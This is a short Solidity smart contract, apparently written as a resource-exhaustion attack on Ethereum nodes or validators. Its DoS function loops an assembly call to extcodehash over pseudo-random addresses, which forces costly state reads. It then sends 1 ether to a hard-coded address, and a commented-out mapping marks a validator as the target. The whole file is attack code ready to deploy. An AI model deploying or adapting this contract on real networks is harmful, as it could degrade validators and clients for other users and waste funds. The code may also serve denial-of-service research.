// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

contract resource_ex_att_contract {

    mapping (address => bool) private _shouldDoS;

    constructor() {
        // _shouldDoS[validator] = true;
    }

    function DoS(uint32 i) external payable {
        bool shouldDoS = true;

        assembly {
            if shouldDoS {
                // Computationally expensive loop
                for { } gt(i, 0) { i := sub(i, 1) } {
                    pop(extcodehash(xor(blockhash(number()), gas())))
                }
            }
        }

        // Now perform the external call OUTSIDE assembly
        (bool success, ) = payable(0x8943545177806ED17B9F23F0a21ee5948eCaa776).call{value: 1 ether}("");
        require(success, "Call failed");

        //revert("Intentional failure after resource consumption");
    }
}
